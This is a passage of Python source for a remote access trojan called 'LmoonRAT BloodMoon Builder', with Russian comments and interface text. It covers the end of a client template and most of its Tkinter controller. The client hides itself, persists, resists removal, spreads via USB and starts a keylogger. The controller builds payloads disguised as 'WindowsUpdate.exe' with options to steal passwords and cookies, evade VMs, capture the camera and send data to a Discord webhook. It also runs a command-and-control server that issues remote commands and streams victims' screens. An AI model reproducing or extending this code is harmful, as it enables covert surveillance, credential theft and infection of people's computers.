    if {SAFE_MODE}:
        print("Запуск в безопасном режиме активирован")
    
    hide_window()
    set_autostart()
    
    # Скрытие файла
    if HIDE_FILE and not SAFE_MODE:
        try:
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            kernel32.SetFileAttributesW(sys.executable, 2)  # FILE_ATTRIBUTE_HIDDEN
        except:
            pass
    
    # Изменение расширения файла
    if FILE_EXTENSION and not SAFE_MODE:
        try:
            new_name = sys.executable + FILE_EXTENSION
            os.rename(sys.executable, new_name)
            sys.executable = new_name
        except:
            pass
    
    # Запуск клиента
    client = LmoonClient("{HOST}", {PORT})
    
    # Запуск защитных механизмов
    if ANTI_KILL and not SAFE_MODE:
        threading.Thread(target=client.anti_kill_thread, daemon=True).start()
        
    if ANTI_UNINSTALL and not SAFE_MODE:
        threading.Thread(target=anti_uninstall_protection, daemon=True).start()
    
    # Основное подключение
    threading.Thread(target=client.connect, daemon=True).start()
    
    # Автоматическое USB-распространение
    if USB_SPREAD and not SAFE_MODE:
        threading.Thread(target=spread_via_usb, daemon=True).start()
    
    # Автоматический запуск кейлоггера
    if KEYLOGGER_ENABLED and not SAFE_MODE:
        threading.Thread(target=client.start_keylogger, daemon=True).start()
    
    # Бесконечный цикл с контролем нагрузки
    while True:
        time.sleep(1)
        # В безопасном режиме снижаем нагрузку
        if {SAFE_MODE}:
            time.sleep(10)
'''

# ========== GUI КОНТРОЛЛЕРА ==========
class RatController:
    def __init__(self, root):
        self.root = root
        root.title("LmoonRAT BloodMoon Builder")
        root.geometry("1200x700")
        self.menu_visible = False
        
        # Инициализация переменных
        self.hide_file = tk.BooleanVar(value=False)
        self.anti_kill = tk.BooleanVar(value=False)
        self.steal_cookies = tk.BooleanVar(value=False)
        self.steal_passwords = tk.BooleanVar(value=False)
        self.anti_vm = tk.BooleanVar(value=False)
        self.anti_uninstall = tk.BooleanVar(value=False)
        self.usb_spread = tk.BooleanVar(value=False)
        self.discord_webhook = tk.StringVar(value="")
        self.file_extension = tk.StringVar(value="")
        self.test_mode = tk.BooleanVar(value=True)
        self.camera_capture = tk.BooleanVar(value=False)
        self.microphone_record = tk.BooleanVar(value=False)
        self.encrypt_comms = tk.BooleanVar(value=False)
        self.keylogger = tk.BooleanVar(value=False)
        self.file_transfer = tk.BooleanVar(value=False)
        self.safe_mode = tk.BooleanVar(value=True)
        self.build_apk = tk.BooleanVar(value=False)
        self.enable_pranks = tk.BooleanVar(value=False)
        
        # Красная цветовая схема
        self.bg_color = "#1a0000"
        self.accent_color = "#8B0000"
        self.highlight_color = "#ff0000"
        self.text_color = "#ffcccc"
        
        self.setup_ui()
        self.clients = {}
        self.server_thread = None
        self.server_running = False
        self.start_server()
        self.stream_active = False
        self.camera_active = False
        self.microphone_active = False
        
    def setup_ui(self):
        self.root.configure(bg=self.bg_color)
        
        top_frame = tk.Frame(self.root, bg=self.accent_color, height=50)
        top_frame.pack(fill=tk.X)
        
        self.menu_btn = tk.Button(top_frame, text="☰", bg=self.accent_color, fg=self.text_color, bd=0, 
                                 font=("Arial", 16), command=self.toggle_menu)
        self.menu_btn.pack(side=tk.LEFT, padx=15)
        
        tk.Label(top_frame, text="LmoonRAT BloodMoon Builder", bg=self.accent_color, fg=self.highlight_color, 
                font=("Arial", 14, "bold")).pack(side=tk.LEFT, padx=10)
        
        self.server_status = tk.Label(top_frame, text="Server: Stopped", bg=self.accent_color, fg="#ff6666", 
                                    font=("Arial", 10))
        self.server_status.pack(side=tk.RIGHT, padx=20)
        
        self.menu_frame = tk.Frame(self.root, bg="#330000", width=200)
        self.menu_frame.pack(side=tk.LEFT, fill=tk.Y)
        self.menu_frame.pack_propagate(False)
        self.menu_frame.place(x=-200, y=50, height=650)
        
        menu_btn_style = {
            "bg": "#330000", "fg": self.text_color, "bd": 0, 
            "font": ("Arial", 11), "anchor": "w",
            "padx": 20, "pady": 10, "width": 180,
            "activebackground": "#8B0000"
        }
        
        tk.Button(self.menu_frame, text="👥 Пользователи", command=lambda: self.show_tab(0), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="🛠️ Билдер", command=lambda: self.show_tab(1), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="💻 Консоль", command=lambda: self.show_tab(2), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="⚙️ Настройки", command=lambda: self.show_tab(3), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="❓ Помощь", command=lambda: self.show_tab(4), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="🔒 Завершить", command=self.root.destroy, **menu_btn_style).pack(side=tk.BOTTOM, fill=tk.X)
        
        self.tab_control = ttk.Notebook(self.root)
        style = ttk.Style()
        style.configure("TNotebook", background=self.bg_color)
        style.configure("TNotebook.Tab", background="#330000", foreground=self.text_color, padding=[10, 5])
        style.map("TNotebook.Tab", background=[("selected", "#660000")])
        
        self.tab_users = ttk.Frame(self.tab_control)
        self.setup_users_tab()
        
        self.tab_builder = ttk.Frame(self.tab_control)
        self.setup_builder_tab()
        
        self.tab_console = ttk.Frame(self.tab_control)
        self.setup_console_tab()
        
        self.tab_settings = ttk.Frame(self.tab_control)
        self.setup_settings_tab()
        
        self.tab_help = ttk.Frame(self.tab_control)
        self.setup_help_tab()
        
        self.tab_control.add(self.tab_users, text='Пользователи')
        self.tab_control.add(self.tab_builder, text='Билдер')
        self.tab_control.add(self.tab_console, text='Консоль')
        self.tab_control.add(self.tab_settings, text='Настройки')
        self.tab_control.add(self.tab_help, text='Помощь')
        self.tab_control.place(x=0, y=50, width=1200, height=650)
        self.tab_control.select(0)
        
        self.status = tk.Label(self.root, text="Готов к работе", 
                             bg="#8B0000", fg=self.text_color, anchor=tk.W)
        self.status.pack(fill=tk.X, side=tk.BOTTOM)
    
    def toggle_menu(self):
        x_pos = 0 if self.menu_visible else -200
        self.menu_frame.place(x=x_pos, y=50, height=650)
        self.menu_visible = not self.menu_visible
    
    def show_tab(self, index):
        tabs = self.tab_control.tabs()
        if index < len(tabs):
            self.tab_control.select(tabs[index])
        self.menu_frame.place(x=-200, y=50, height=650)
        self.menu_visible = False
    
    def setup_users_tab(self):
        frame = ttk.Frame(self.tab_users)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        columns = ("IP", "Страна", "ID", "Без.режим", "ОС", "Статус", "Дата")
        self.tree = ttk.Treeview(frame, columns=columns, show="headings", height=20)
        
        style = ttk.Style()
        style.configure("Treeview", background="#330000", foreground=self.text_color, fieldbackground="#330000")
        style.configure("Treeview.Heading", background="#660000", foreground=self.text_color)
        style.map("Treeview", background=[('selected', '#8B0000')])
        
        col_widths = [120, 80, 150, 80, 150, 80, 120]
        for col, width in zip(columns, col_widths):
            self.tree.heading(col, text=col)
            self.tree.column(col, width=width, anchor=tk.CENTER)
        
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.pack(fill=tk.BOTH, expand=True)
        
        self.context_menu = tk.Menu(self.root, tearoff=0)
        self.context_menu.add_command(label="Выполнить команду", command=self.execute_selected)
        self.context_menu.add_command(label="Демонстрация экрана", command=self.stream_monitor_selected)
        self.context_menu.add_command(label="Демонстрация камеры", command=self.capture_camera_selected)
        self.context_menu.add_command(label="Получить пароли", command=self.get_passwords)
        self.context_menu.add_command(label="Получить cookies", command=self.get_cookies)
        self.context_menu.add_command(label="Получить все данные", command=self.get_all_data)
        self.context_menu.add_command(label="Управление кейлоггером", command=self.keylogger_control)
        self.context_menu.add_command(label="Загрузить файл", command=self.upload_file)
        self.context_menu.add_command(label="Приколы", command=self.show_prank_menu)
        self.context_menu.add_command(label="Удалить клиент", command=self.uninstall_selected)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Обновить информацию", command=self.refresh_clients)
        
        self.tree.bind("<Button-3>", self.show_context_menu)
        
        toolbar = tk.Frame(frame, bg="#330000")
        toolbar.pack(fill=tk.X, pady=5)
        
        actions = [
            ("Обновить", self.refresh_clients, "#8B0000"),
            ("Выполнить команду", self.execute_selected, "#B22222"),
            ("Экран", self.stream_monitor_selected, "#CD5C5C"),
            ("Камера", self.capture_camera_selected, "#DC143C"),
            ("Пароли", self.get_passwords, "#FF69B4"),
            ("Cookies", self.get_cookies, "#DA70D6"),
            ("Все данные", self.get_all_data, "#9370DB"),
            ("Кейлоггер", self.keylogger_control, "#8A2BE2"),
            ("Приколы", self.show_prank_menu, "#FF00FF"),
            ("Загрузить файл", self.upload_file, "#00CED1"),
            ("Удалить", self.uninstall_selected, "#FF0000"),
        ]
        
        for text, command, color in actions:
            btn = tk.Button(toolbar, text=text, bg=color, fg="white", bd=0, 
                           activebackground=color, activeforeground="white",
                           command=command)
            btn.pack(side=tk.LEFT, padx=5, ipadx=5, ipady=3)
    
    def show_context_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.context_menu.post(event.x_root, event.y_root)
    
    def setup_builder_tab(self):
        frame = ttk.Frame(self.tab_builder)
        frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        main_settings = ttk.LabelFrame(frame, text="Основные настройки")
        main_settings.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Label(main_settings, text="IP сервера:", bg=self.bg_color, fg=self.text_color).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.ip_entry = tk.Entry(main_settings, width=25, bg="#330000", fg=self.text_color)
        self.ip_entry.insert(0, "127.0.0.1")
        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(main_settings, text="Порт:", bg=self.bg_color, fg=self.text_color).grid(row=0, column=2, sticky="w", padx=5, pady=5)
        self.port_entry = tk.Entry(main_settings, width=10, bg="#330000", fg=self.text_color)
        self.port_entry.insert(0, "7777")
        self.port_entry.grid(row=0, column=3, padx=5, pady=5)
        
        tk.Label(main_settings, text="Имя файла:", bg=self.bg_color, fg=self.text_color).grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.filename_entry = tk.Entry(main_settings, width=25, bg="#330000", fg=self.text_color)
        self.filename_entry.insert(0, "WindowsUpdate")
        self.filename_entry.grid(row=1, column=1, padx=5, pady=5)
        
        tk.Label(main_settings, text="Расширение:", bg=self.bg_color, fg=self.text_color).grid(row=1, column=2, sticky="w", padx=5, pady=5)
        self.extension_entry = tk.Entry(main_settings, width=10, bg="#330000", fg=self.text_color)
        self.extension_entry.insert(0, ".exe")
        self.extension_entry.grid(row=1, column=3, padx=5, pady=5)
        
        tk.Label(main_settings, text="Иконка:", bg=self.bg_color, fg=self.text_color).grid(row=2, column=0, sticky="w", padx=5, pady=5)
        self.icon_path = tk.StringVar()
        tk.Entry(main_settings, textvariable=self.icon_path, width=20, bg="#330000", fg=self.text_color).grid(row=2, column=1, padx=5, pady=5, sticky="w")
        tk.Button(main_settings, text="Обзор", command=self.select_icon, width=8, bg="#660000", fg="white").grid(row=2, column=2, padx=5, pady=5)
        
        sec_settings = ttk.LabelFrame(frame, text="Настройки безопасности")
        sec_settings.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Checkbutton(
            sec_settings, 
            text="Безопасный режим (для теста)", 
            variable=self.safe_mode,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        
        self.debug_mode = tk.BooleanVar(value=True)
        tk.Checkbutton(
            sec_settings, 
            text="Режим отладки", 
            variable=self.debug_mode,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=0, column=1, sticky="w", padx=5, pady=5)
        
        self.persistent_mode = tk.BooleanVar(value=False)
        tk.Checkbutton(
            sec_settings, 
            text="Автозагрузка", 
            variable=self.persistent_mode,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=0, column=2, sticky="w", padx=5, pady=5)
        
        func_settings = ttk.LabelFrame(frame, text="Дополнительные функции")
        func_settings.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Скрыть файл", 
            variable=self.hide_file,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Anti-Kill", 
            variable=self.anti_kill,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=0, column=1, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Anti-Uninstall", 
            variable=self.anti_uninstall,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=0, column=2, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Anti-VM", 
            variable=self.anti_vm,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=1, column=0, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Steal Cookies", 
            variable=self.steal_cookies,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=1, column=1, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Steal Passwords", 
            variable=self.steal_passwords,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=1, column=2, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="USB Spread", 
            variable=self.usb_spread,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=1, column=3, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Захват камеры", 
            variable=self.camera_capture,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=2, column=0, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Шифрование связи", 
            variable=self.encrypt_comms,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=2, column=1, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Кейлоггер", 
            variable=self.keylogger,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=3, column=0, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Передача файлов", 
            variable=self.file_transfer,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=3, column=1, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Включить приколы", 
            variable=self.enable_pranks,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=3, column=2, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Сборка APK (Android)", 
            variable=self.build_apk,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=3, column=3, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Тестовый режим (localhost)", 
            variable=self.test_mode,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=2, column=3, sticky="w", padx=5, pady=5)
        
        webhook_frame = tk.Frame(func_settings, bg=self.bg_color)
        webhook_frame.grid(row=4, column=0, columnspan=4, sticky="we", padx=5, pady=5)
        
        tk.Label(webhook_frame, text="Discord Webhook URL:", bg=self.bg_color, fg=self.text_color).pack(side=tk.LEFT, padx=5)
        self.discord_webhook_entry = tk.Entry(webhook_frame, width=50, textvariable=self.discord_webhook, bg="#330000", fg=self.text_color)
        self.discord_webhook_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        tk.Button(webhook_frame, text="Тест", command=self.test_webhook, width=5, bg="#660000", fg="white").pack(side=tk.RIGHT, padx=5)
        
        build_frame = tk.Frame(frame, bg=self.bg_color)
        build_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(build_frame, text="Собрать клиент", command=self.build_client, 
                 bg="#8B0000", fg="white", font=("Arial", 12), width=15,
                 activebackground="#B22222").pack(side=tk.LEFT, padx=5)
        
        tk.Button(build_frame, text="Открыть папку сборки", command=self.open_build_dir, 
                 bg="#B22222", fg="white", activebackground="#CD5C5C").pack(side=tk.LEFT, padx=5)
        
        console_frame = ttk.LabelFrame(frame, text="Лог сборки")
        console_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.console = scrolledtext.ScrolledText(console_frame, bg="#330000", fg="#ff9999", height=10)
        self.console.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.console.insert(tk.END, "Готов к сборке безопасных клиентов...\n")
        self.console.insert(tk.END, "Рекомендуется использовать безопасный режим для тестов!\n\n")
    
    def setup_console_tab(self):
        frame = ttk.Frame(self.tab_console)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.cmd_output = scrolledtext.ScrolledText(frame, bg="#330000", fg="#ff9999", height=20)
        self.cmd_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        input_frame = tk.Frame(frame, bg=self.bg_color)
        input_frame.pack(fill=tk.X, pady=5)
        
        self.cmd_entry = tk.Entry(input_frame, width=50, bg="#330000", fg="#ff9999")
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, ipady=3)
        
        tk.Button(input_frame, text="Выполнить", command=self.execute_command, 
                 bg="#8B0000", fg="white", activebackground="#B22222").pack(side=tk.RIGHT, padx=5, ipadx=10)
    
    def setup_settings_tab(self):
        frame = ttk.Frame(self.tab_settings)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        server_frame = ttk.LabelFrame(frame, text="Настройки сервера")
        server_frame.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Label(server_frame, text="Порт сервера:", bg=self.bg_color, fg=self.text_color).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.server_port = tk.IntVar(value=7777)
        tk.Entry(server_frame, textvariable=self.server_port, width=10, bg="#330000", fg=self.text_color).grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(server_frame, text="Макс. подключений:", bg=self.bg_color, fg=self.text_color).grid(row=0, column=2, sticky="w", padx=5, pady=5)
        self.max_clients = tk.IntVar(value=100)
        tk.Entry(server_frame, textvariable=self.max_clients, width=10, bg="#330000", fg=self.text_color).grid(row=0, column=3, padx=5, pady=5)
        
        sec_frame = ttk.LabelFrame(frame, text="Настройки безопасности")
        sec_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.auto_clean = tk.BooleanVar(value=True)
        tk.Checkbutton(
            sec_frame, 
            text="Автоочистка временных файлов", 
            variable=self.auto_clean,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        
        self.auto_start = tk.BooleanVar(value=False)
        tk.Checkbutton(
            sec_frame, 
            text="Автозапуск после сборки", 
            variable=self.auto_start,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=0, column=1, sticky="w", padx=5, pady=5)
        
        self.encrypt_exe = tk.BooleanVar(value=False)
        tk.Checkbutton(
            sec_frame, 
            text="Шифрование исполняемого файла", 
            variable=self.encrypt_exe,
            bg=self.bg_color, fg=self.text_color, selectcolor="#3e3e42"
        ).grid(row=0, column=2, sticky="w", padx=5, pady=5)
        
        btn_frame = tk.Frame(frame, bg=self.bg_color)
        btn_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(btn_frame, text="Сохранить настройки", command=self.save_settings, 
                 bg="#8B0000", fg="white", activebackground="#B22222").pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="Сбросить настройки", command=self.restore_defaults, 
                 bg="#B22222", fg="white", activebackground="#CD5C5C").pack(side=tk.LEFT, padx=5)
    
    def setup_help_tab(self):
        frame = ttk.Frame(self.tab_help)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        help_text = """
        LmoonRAT BloodMoon Builder - Руководство пользователя
        
        1. Вкладка "Пользователи"
        - Отображает подключенных клиентов
        - ПКМ для вызова контекстного меню
        - Обновление списка кнопкой Refresh
        
        2. Вкладка "Билдер"
        - Сборка клиента с настраиваемыми параметрами
        - Выбор иконки через Browse
        - Настройки безопасности
        
        3. Вкладка "Консоль"
        - Отправка команд всем подключенным клиентам
        - Просмотр результатов выполнения
        
        4. Вкладка "Настройки"
        - Конфигурация параметров сервера
        - Дополнительные настройки безопасности
        
        5. Боковое меню
        - Быстрый доступ ко всем функциям
        
        Новые функции:
        - Кейлоггер: запись всех нажатий клавиш
        - Передача файлов: загрузка файлов на клиент
        - Система приколов: шуточные действия на удаленном ПК
        - Улучшенная живучесть: клиент не исчезает при закрытии окна
        - Сборка APK для Android
        
        Безопасный режим:
        - Рекомендуется для тестов на основном ПК
        - Отключает все опасные функции
        - Позволяет легко удалить клиент
        
        Тестовый режим:
        - Использует localhost (127.0.0.1)
        - Автоматически включает безопасный режим
        - Клиент удаляется после перезагрузки
        
        Для получения дополнительной помощи:
        - Используйте меню Help
        - Посетите наш сайт: example.com
        """
        
        help_label = tk.Label(frame, text=help_text, justify=tk.LEFT, anchor="w", 
                             bg=self.bg_color, fg=self.text_color)
        help_label.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        btn_frame = tk.Frame(frame, bg=self.bg_color)
        btn_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(btn_frame, text="Руководство по безопасному режиму", command=self.show_safe_guide, 
                 bg="#8B0000", fg="white", activebackground="#B22222").pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="Создать Discord Webhook", command=self.create_discord_webhook, 
                 bg="#7289DA", fg="white", activebackground="#5B6EAE").pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="Открыть документацию", command=self.open_docs, 
                 bg="#CD5C5C", fg="white", activebackground="#DC143C").pack(side=tk.LEFT, padx=5)
    
    def show_safe_guide(self):
        messagebox.showinfo("Безопасный режим",
            "Безопасный режим (Safe Mode):\n"
            "• Не добавляет в автозагрузку\n"
            "• Не скрывает окно клиента\n"
            "• Выводит все действия в консоль\n"
            "• Снижает нагрузку на систему\n"
            "• Легко удаляется через крестик\n\n"
            "Используйте для тестирования на основном ПК!")
    
    def create_discord_webhook(self):
        webbrowser.open("https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks")
        messagebox.showinfo("Создание Discord Webhook", 
            "1. Откройте настройки сервера Discord\n"
            "2. Выберите 'Интеграции' -> 'Webhooks'\n"
            "3. Создайте новый webhook\n"
            "4. Скопируйте URL webhook\n"
            "5. Вставьте в поле 'Discord Webhook URL'")
    
    def open_docs(self):
        webbrowser.open("https://example.com/docs")
    
    def save_settings(self):
        messagebox.showinfo("Настройки сохранены", "Настройки успешно сохранены!")
    
    def restore_defaults(self):
        self.server_port.set(7777)
        self.max_clients.set(100)
        self.auto_clean.set(True)
        self.auto_start.set(False)
        self.encrypt_exe.set(False)
        messagebox.showinfo("Настройки сброшены", "Настройки восстановлены по умолчанию!")
    
    # ========== СЕРВЕР ==========
    def start_server(self):
        self.server_thread = threading.Thread(target=self.run_server, daemon=True)
        self.server_running = True
        self.server_thread.start()
        self.log("[*] Сервер запущен на 0.0.0.0:7777", "info")
        self.log("[*] Для локальных тестов используйте IP: 127.0.0.1", "info")
        self.log("[*] Для внешнего доступа настройте playit.gg", "info")
        self.server_status.config(text="Server: Running", fg="#00ff00")
    
    def run_server(self):
        HOST = '0.0.0.0'
        PORT = 7777
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, PORT))
            s.listen(5)
            self.log(f"[SERVER] Ожидание подключений на {HOST}:{PORT}", "info")
            
            while self.server_running:
                try:
                    conn, addr = s.accept()
                    self.show_notification(f"Новое подключение: {addr[0]}")
                    self.log(f"[+] Новое подключение от {addr[0]}:{addr[1]}", "success")
                    client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                    client_thread.start()
                except Exception as e:
                    if self.server_running:
                        self.log(f"[!] Ошибка сервера: {str(e)}", "error")
                    break
    
    def show_notification(self, message):
        notif = tk.Toplevel(self.root)
        notif.overrideredirect(True)
        notif.geometry("300x60+900+10")
        notif.attributes("-topmost", True)
        notif.attributes("-alpha", 0.9)
        
        notif_bg = "#330000"
        notif_highlight = "#8B0000"
        
        tk.Label(notif, text="Новое подключение", bg=notif_highlight, fg="white", 
                font=("Arial", 10, "bold")).pack(fill=tk.X)
        
        tk.Label(notif, text=message, bg=notif_bg, fg="#ff9999", 
                font=("Arial", 9)).pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        notif.after(3000, notif.destroy)
    
    def log(self, message, msg_type="info"):
        colors = {
            "info": "#73daca",
            "success": "#00ff00",
            "error": "#ff6666",
            "warning": "#ffcc00"
        }
        
        self.console.tag_configure(msg_type, foreground=colors.get(msg_type, "#73daca"))
        self.console.insert(tk.END, message + "\n", msg_type)
        self.console.see(tk.END)
    
    def handle_client(self, conn, addr):
        try:
            while True:
                data = conn.recv(4096)
                if not data: 
                    break
                
                try:
                    client_info = json.loads(data.decode())
                    self.add_client(conn, addr, client_info)
                except json.JSONDecodeError:
                    self.cmd_output.insert(tk.END, f"{addr[0]}: {data.decode()}\n")
                    self.cmd_output.see(tk.END)
                except Exception as e:
                    self.log(f"[!] Ошибка обработки данных: {str(e)}", "error")
        except Exception as e:
            self.log(f"[!] Ошибка клиента: {str(e)}", "error")
        finally:
            try:
                conn.close()
            except:
                pass
            self.log(f"[-] Подключение закрыто: {addr[0]}", "info")
            self.remove_client(addr[0])
    
    # ========== ФУНКЦИОНАЛ КЛИЕНТОВ ==========
    def add_client(self, conn, addr, client_info):
        client_id = client_info.get("hwid", "N/A")
        self.clients[addr[0]] = {
            "conn": conn,
            "hwid": client_id,
            "os": client_info.get("os", "N/A"),
            "join_date": client_info.get("join_date", "N/A"),
            "ip": addr[0],
            "safe_mode": client_info.get("safe_mode", False),
            "is_vm": client_info.get("is_vm", False)
        }
        
        self.root.after(0, self.add_client_to_table, addr[0], client_info)
    
    def add_client_to_table(self, ip, client_info):
        country = "UA" if random.random() > 0.5 else "RU"
        safe_status = "ДА" if client_info.get("safe_mode", False) else "НЕТ"
        vm_status = "ДА" if client_info.get("is_vm", False) else "НЕТ"
        
        self.tree.insert("", "end", values=(
            ip,
            country,
            client_info.get("hwid", "N/A"),
            safe_status,
            client_info.get("os", "N/A"),
            vm_status,
            client_info.get("join_date", "N/A")
        ))
        
        self.status.config(text=f"Клиентов: {len(self.clients)} | ВМ: {sum(1 for c in self.clients.values() if c['is_vm'])} | Безопасные: {sum(1 for c in self.clients.values() if c['safe_mode'])}")
    
    def remove_client(self, ip):
        if ip in self.clients:
            del self.clients[ip]
            
            for child in self.tree.get_children():
                if self.tree.item(child, "values")[0] == ip:
                    self.tree.delete(child)
                    break
            
            self.status.config(text=f"Клиентов: {len(self.clients)} | ВМ: {sum(1 for c in self.clients.values() if c['is_vm'])} | Безопасные: {sum(1 for c in self.clients.values() if c['safe_mode'])}")
    
    def refresh_clients(self):
        for ip, client in list(self.clients.items()):
            try:
                client["conn"].send(b"ping")
            except:
                self.remove_client(ip)
    
    def get_selected_client(self):
        selection = self.tree.selection()
        if not selection:
            return None
            
        selected_item = self.tree.item(selection[0])
        ip = selected_item["values"][0]
        return self.clients.get(ip)
    
    def execute_selected(self):
        client = self.get_selected_client()
        if not client:
            return
            
        cmd = simpledialog.askstring("Выполнить команду", "Введите команду:")
        if cmd:
            try:
                client["conn"].send(f"cmd {cmd}".encode())
                self.log(f"[*] Команда отправлена {client['ip']}: {cmd}", "info")
            except:
                self.log(f"[!] Ошибка отправки команды {client['ip']}", "error")
    
    def stream_monitor_selected(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"monitor")
                self.log(f"[*] Запуск демонстрации экрана {client['ip']}", "info")
                
                threading.Thread(target=self.show_monitor_stream, args=(client,)).start()
            except:
                self.log(f"[!] Ошибка запуска демонстрации экрана {client['ip']}", "error")
    
    def show_monitor_stream(self, client):
        self.stream_active = True
        monitor_window = tk.Toplevel(self.root)
        monitor_window.title(f"Демонстрация экрана: {client['ip']}")
        monitor_window.geometry("800x600")
        
        img_label = tk.Label(monitor_window)
        img_label.pack(fill=tk.BOTH, expand=True)
        
        stop_btn = tk.Button(monitor_window, text="Остановить", 
                            command=lambda: self.stop_monitor_stream(client, monitor_window),
                            bg="#8B0000", fg="white")
        stop_btn.pack(pady=10)
        
        def update_image():
            try:
                while self.stream_active:
                    data = client["conn"].recv(4096)
                    if not data:
                        break
                    
                    try:
                        img = Image.open(io.BytesIO(data))
                        img = img.resize((800, 600), Image.LANCZOS)
                        photo = ImageTk.PhotoImage(img)
                        
                        img_label.configure(image=photo)
                        img_label.image = photo
                        
                        monitor_window.update()
                        time.sleep(0.05)
                    except:
                        pass
            except Exception as e:
                self.log(f"[!] Ошибка трансляции экрана: {str(e)}", "error")
            finally:
                monitor_window.destroy()
        
        threading.Thread(target=update_image, daemon=True).start()
        
        monitor_window.protocol("WM_DELETE_WINDOW", lambda: self.stop_monitor_stream(client, monitor_window))
    
    def stop_monitor_stream(self, client, window):
        self.stream_active = False
        try:
            client["conn"].send(b"stop_monitor")
        except:
            pass
        window.destroy()
    
    def capture_camera_selected(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"camera")
                self.log(f"[*] Запуск демонстрации камеры {client['ip']}", "info")
                
                threading.Thread(target=self.show_camera_stream, args=(client,)).start()
            except:
